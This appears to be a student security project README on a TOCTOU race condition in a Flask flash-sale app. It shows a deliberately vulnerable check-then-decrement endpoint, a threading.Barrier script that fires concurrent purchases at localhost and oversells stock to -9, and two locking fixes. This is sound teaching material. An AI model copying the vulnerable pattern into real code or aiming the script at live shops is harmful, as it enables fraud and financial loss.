# Race Condition / TOCTOU — Flash Sale Inventory Oversell

**Web Systems Security — Final Project | Track A — POC Attack Research & Implementation**
**Student:** Yousef Hasan hamda , 324986116| **Institution:** Azrieli College of Engineering | **Year:** 2026

---

## Table of Contents
1. [Vulnerability Description & Theoretical Background](#1-vulnerability-description--theoretical-background)
2. [Work Environment](#2-work-environment)
3. [POC — Attack Implementation & Demonstration](#3-poc--attack-implementation--demonstration)
4. [Defense Mechanisms & Prevention](#4-defense-mechanisms--prevention)
5. [Project Structure & How to Run](#5-project-structure--how-to-run)
6. [Sources](#6-sources)

---

## 1. Vulnerability Description & Theoretical Background

### What is the Vulnerability?

A **Race Condition** is a security vulnerability that occurs when a system performs multiple operations on shared data without proper synchronization. The specific subtype demonstrated here is **TOCTOU — Time-Of-Check to Time-Of-Use**.

In a TOCTOU flaw, there is a dangerous gap between two moments:
- **Time-Of-Check (TOC):** when the application reads/verifies a value (e.g., "is there stock available?")
- **Time-Of-Use (TUE):** when the application acts on that value (e.g., "decrement the stock")

If multiple requests enter the gap between these two steps simultaneously, they all pass the check before any of them updates the data — causing unintended behavior.

### How is it Created?

The vulnerability is created when an application:
1. Reads a value from the database (**CHECK**)
2. Performs some processing — even just a few milliseconds (**RACE WINDOW OPENS**)
3. Writes back to the database based on what it read earlier (**USE**)

Any concurrent request that arrives during step 2 will read the same original value, pass the same check, and perform the same action — even though only one should have succeeded.

```
Thread 1:  [READ stock=1] ---delay--- [WRITE stock=0]  ✓
Thread 2:       [READ stock=1] ---delay--- [WRITE stock=0]  ✓ (should have failed!)
Thread 3:            [READ stock=1] ---delay--- [WRITE stock=0]  ✓ (should have failed!)
Result: stock = 1 - 3 = -2  ← OVERSELL
```

### Context in Web Applications

Race conditions appear in web applications whenever:
- A **single-use resource** (coupon, stock item, promo code, seats) is checked and then decremented non-atomically
- **Financial operations** (balance check → transfer) have a gap between check and update
- **Authentication flows** (MFA status check → session grant) involve multiple sequential DB operations
- Any endpoint that reads-then-writes without atomic transactions

> ⚠️ **This scenario is original — different from the lecture.**
> The lecture demonstrated: coupon reuse (`/cart/coupon`), MFA bypass, and cart manipulation.
> This project uses: **Flash Sale Inventory Oversell** — a different TOCTOU context.
> The attack tool used here (Python `threading.Barrier`) is also different from the lecture tool (BurpSuite).

### What Can an Attacker Achieve?

- Purchase more items than exist in stock (negative inventory = financial loss)
- Apply a discount/coupon multiple times simultaneously
- Withdraw more money than is in an account
- Register for more seats/slots than available
- Bypass rate-limiting or usage-cap controls

---

## 2. Work Environment

### Technologies

| Component | Technology |
|---|---|
| Language | Python 3 |
| Web Framework | Flask |
| Database | SQLite (WAL mode for concurrency) |
| Concurrency | Python `threading` module |
| OS | macOS / Linux / Windows |

### Tools Used for Demonstration

| Tool | Purpose | Notes |
|---|---|---|
| `threading.Barrier` | Synchronized concurrent attack | All threads release simultaneously |
| `requests` library | HTTP client for sending purchase requests | Standard Python library |
| Flask dev server | Runs the vulnerable/fixed web apps | `threaded=True` enables concurrent handling |
| SQLite WAL mode | Database concurrency support | Write-Ahead Logging for better throughput |

> **Tool comparison with lecture:**
> The lecture used **BurpSuite** with Last-Byte Synchronization and Single-Packet Attack (HTTP/2) to achieve simultaneous requests at the network level.
> This project uses **Python `threading.Barrier`** which achieves the same simultaneous-fire effect at the OS thread scheduler level — a programmatic alternative that is more reproducible and controllable for lab demonstration.

---

## 3. POC — Attack Implementation & Demonstration

### POC Description

The POC consists of three Flask applications running on different ports, and one attack script:

| App | Port | Description |
|---|---|---|
| `app_vulnerable.py` | 5000 | Contains the TOCTOU bug |
| `app_fix1_pessimistic.py` | 5001 | Fixed with Pessimistic Locking (BEGIN IMMEDIATE) |
| `app_fix2_optimistic.py` | 5002 | Fixed with Optimistic Locking (version counter) |
| `exploit.py` | — | Attack script using `threading.Barrier` |

### Exploitation Steps

**Step 1 — The vulnerable server starts with 1 item in stock:**
```
GET /status → { "stock": 1, "purchases": [] }
```

**Step 2 — The exploit creates 10 threads, all waiting at a Barrier:**
```python
barrier = threading.Barrier(10)
threads = [Thread(target=send_buy, args=(url, user_id, barrier)) for i in range(10)]
```

**Step 3 — All threads release simultaneously when the last one arrives:**
```python
def send_buy(url, user_id, barrier):
    barrier.wait()   # ← all 10 threads hold here until everyone is ready
    requests.post(f"{url}/buy", json={"user_id": user_id})
```

**Step 4 — All 10 requests hit the vulnerable endpoint at the same moment:**
```python
# VULNERABLE CODE (app_vulnerable.py)
product = conn.execute("SELECT stock FROM products WHERE id=1").fetchone()
stock = product["stock"]          # All 10 threads read stock=1 ← CHECK

if stock <= 0:
    return "Out of stock", 400    # None of them fail here

time.sleep(0.05)                  # ← RACE WINDOW: 50ms delay simulates payment processing

conn.execute("UPDATE products SET stock = stock - 1 WHERE id=1")  # All 10 decrement ← USE
```

### Payloads / Code

**Attack script (key section):**
```python
import threading, requests

def send_buy(url, user_id, barrier):
    barrier.wait()  # synchronization point
    response = requests.post(f"{url}/buy", json={"user_id": user_id}, timeout=10)
    return response.json()

barrier = threading.Barrier(10)
threads = [
    threading.Thread(target=send_buy, args=("http://localhost:5000", f"user_{i}", barrier))
    for i in range(10)
]
for t in threads: t.start()
for t in threads: t.join()
```

**Run the attack:**
```bash
python src/poc/exploit.py --target all --threads 10
```

### Actual Result of Exploitation

```
TARGET: VULNERABLE (port 5000)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  user_01   200   Purchase successful!
  user_02   200   Purchase successful!
  user_03   200   Purchase successful!
  user_04   200   Purchase successful!
  user_05   200   Purchase successful!
  user_06   200   Purchase successful!
  user_07   200   Purchase successful!
  user_08   200   Purchase successful!
  user_09   200   Purchase successful!
  user_10   200   Purchase successful!

  Initial stock  : 1
  Final stock    : -9   ← NEGATIVE (OVERSELL!)
  Total purchases: 10   ← 10 users bought 1 item
  RACE CONDITION EXPLOITED — OVERSELL by 9
```

### Diagram — Attack Flow

```
┌─────────────────────────────────────────────────────────────────────┐
│                    VULNERABLE — TOCTOU Attack                       │
├─────────────────────────────────────────────────────────────────────┤
│                                                                     │
│  Thread 1 ──→ [SELECT stock=1] ──→ [sleep 50ms] ──→ [UPDATE -1]   │
│  Thread 2 ───→ [SELECT stock=1] ──→ [sleep 50ms] ──→ [UPDATE -1]  │
│  Thread 3 ────→ [SELECT stock=1] ─→ [sleep 50ms] ──→ [UPDATE -1]  │
│  ...                                                                │
│  Thread 10 ─────→ [SELECT stock=1] → [sleep 50ms] ──→ [UPDATE -1] │
│                                                                     │
│  All 10 see stock=1 → All 10 pass the check → stock = 1-10 = -9   │
│                    ↑                                                │
│              RACE WINDOW                                            │
└─────────────────────────────────────────────────────────────────────┘
```

*(See `diagrams/race_condition_diagram.png` for the full 3-panel visual diagram)*

---

## 4. Defense Mechanisms & Prevention

### Why Did the Existing Defense Fail?

The original code used a simple `if stock <= 0: return "Out of stock"` check. This failed because:
- The **check** (SELECT) and the **use** (UPDATE) are two separate database operations
- Between these two operations there is a time gap (even just milliseconds)
- SQLite's default mode does not serialize concurrent reads
- All concurrent threads read the same stale value before any of them writes back

### Fix 1 — Pessimistic Locking (`BEGIN IMMEDIATE`)

```python
# app_fix1_pessimistic.py
conn.execute("BEGIN IMMEDIATE")  # ← acquires exclusive write lock immediately

cursor = conn.execute(
    "UPDATE products SET stock = stock - 1 WHERE id=1 AND stock > 0"
)
if cursor.rowcount == 0:
    conn.execute("ROLLBACK")
    return {"success": False, "message": "Out of stock!"}, 400

conn.execute("COMMIT")
```

**How it works:** `BEGIN IMMEDIATE` acquires an exclusive write lock before any reads. All concurrent threads queue up — only one executes at a time. The `WHERE stock > 0` condition ensures atomicity: the check and the decrement are a **single SQL statement**.

**Result:** 1 purchase recorded, stock = 0 ✅

### Fix 2 — Optimistic Locking / Version Counter *(not covered in lecture)*

```python
# app_fix2_optimistic.py
row = conn.execute("SELECT stock, version FROM products WHERE id=1").fetchone()
current_stock, current_version = row["stock"], row["version"]

if current_stock <= 0:
    return {"success": False, "message": "Out of stock!"}, 400

# Guard clause: only update if version hasn't changed
cursor = conn.execute("""
    UPDATE products
       SET stock = stock - 1, version = version + 1
     WHERE id = 1 AND version = ? AND stock > 0
""", (current_version,))

if cursor.rowcount == 0:
    # Version changed — someone else bought it first → retry
    continue
```

**How it works:** Each row carries a `version` integer. If two threads both read `version=5` and both try to update, only one succeeds (version becomes 6). The other finds `version ≠ 5`, gets `rowcount=0`, and retries — on retry it reads `stock=0` and returns "Out of stock".

**Result:** 1 purchase recorded, stock = 0, version = 1 ✅

### Comparison: Fix 1 vs Fix 2

| Property | Fix 1 — Pessimistic | Fix 2 — Optimistic |
|---|---|---|
| **Locking** | Blocks all writers immediately | No lock on reads |
| **Conflict detection** | Prevented (serialized) | Detected at write time |
| **Best for** | High-write, low-read | High-read, low-write |
| **DB support** | SQLite `BEGIN IMMEDIATE` | Any DB with version column |
| **In lecture?** | No | No |

### Best Practices

| Practice | Description |
|---|---|
| Use atomic transactions | Wrap check+update in a single transaction |
| Use `WHERE` guards in UPDATE | `UPDATE ... WHERE stock > 0` eliminates the race |
| Use DB-level constraints | `CHECK(stock >= 0)` as a last-resort safeguard |
| Use optimistic locking | Version counters prevent silent overwrites |
| Use connection timeouts | `timeout=10`, `PRAGMA busy_timeout=5000` |
| Enable WAL mode | `PRAGMA journal_mode=WAL` for SQLite concurrency |
| Avoid application-level checks | Never rely on a separate SELECT to guard an UPDATE |
| Test with concurrent requests | Use tools like `threading.Barrier` or BurpSuite to verify |

---

## 5. Project Structure & How to Run

### Project Structure

```
final-project-yousef-hamda/
├── src/
│   ├── vulnerable/
│   │   └── app_vulnerable.py        ← Vulnerable Flask app (port 5000)
│   ├── fixed/
│   │   ├── app_fix1_pessimistic.py  ← Fix 1: Pessimistic Lock (port 5001)
│   │   └── app_fix2_optimistic.py   ← Fix 2: Optimistic Lock / Version Counter (port 5002)
│   └── poc/
│       └── exploit.py               ← Attack script (Python threading.Barrier)
├── diagrams/
│   └── race_condition_diagram.png   ← 3-panel attack flow diagram
├── report/
│   └── Race_Condition_Report_FINAL.docx  ← Full written report
├── .gitignore
├── LICENSE
└── README.md
```

### Step 1 — Install dependencies

```bash
pip install flask requests
```

### Step 2 — Start all 3 servers (each in a separate terminal)

```bash
# Terminal 1 — Vulnerable App (port 5000)
python src/vulnerable/app_vulnerable.py

# Terminal 2 — Fix 1: Pessimistic Lock (port 5001)
python src/fixed/app_fix1_pessimistic.py

# Terminal 3 — Fix 2: Optimistic Lock (port 5002)
python src/fixed/app_fix2_optimistic.py
```

### Step 3 — Run the attack

```bash
# Attack all 3 servers and compare results
python src/poc/exploit.py --target all --threads 10

# Or test individually
python src/poc/exploit.py --target vulnerable
python src/poc/exploit.py --target fixed
python src/poc/exploit.py --target optimistic
```

### API Endpoints (same on all 3 servers)

| Method | Endpoint | Description |
|---|---|---|
| `GET` | `/status` | Returns current stock, version, and all purchases |
| `POST` | `/buy` | Purchase endpoint — body: `{"user_id": "alice"}` |
| `POST` | `/reset` | Resets DB: stock=1, purchases cleared |

### Expected Results

| Server | Port | Result | Final Stock | Purchases |
|---|---|---|---|---|
| Vulnerable | 5000 | 🔴 OVERSELL | -9 | 10 |
| Fix 1 — Pessimistic Lock | 5001 | 🟢 PROTECTED | 0 | 1 |
| Fix 2 — Optimistic Lock | 5002 | 🟢 PROTECTED | 0 (ver=1) | 1 |

---

## 6. Sources

| Source | Link |
|---|---|
| PortSwigger — Race Conditions | https://portswigger.net/web-security/race-conditions |
| OWASP — Race Condition | https://owasp.org/www-community/vulnerabilities/Race_Condition |
| Van Goethem et al. (2020) — Timeless Timing Attacks (USENIX) | https://www.usenix.org/conference/usenixsecurity20/presentation/van-goethem |
| Kettle (2023) — Smashing the state machine | https://portswigger.net/research/smashing-the-state-machine |
| SQLite WAL Mode (official docs) | https://www.sqlite.org/wal.html |
| SQLite BEGIN IMMEDIATE | https://www.sqlite.org/lang_transaction.html |
| Python threading.Barrier | https://docs.python.org/3/library/threading.html#threading.Barrier |
| CWE-362 — Race Condition | https://cwe.mitre.org/data/definitions/362.html |

---

*All code and demonstrations are for educational purposes only. The lab environment is fully isolated and self-contained.*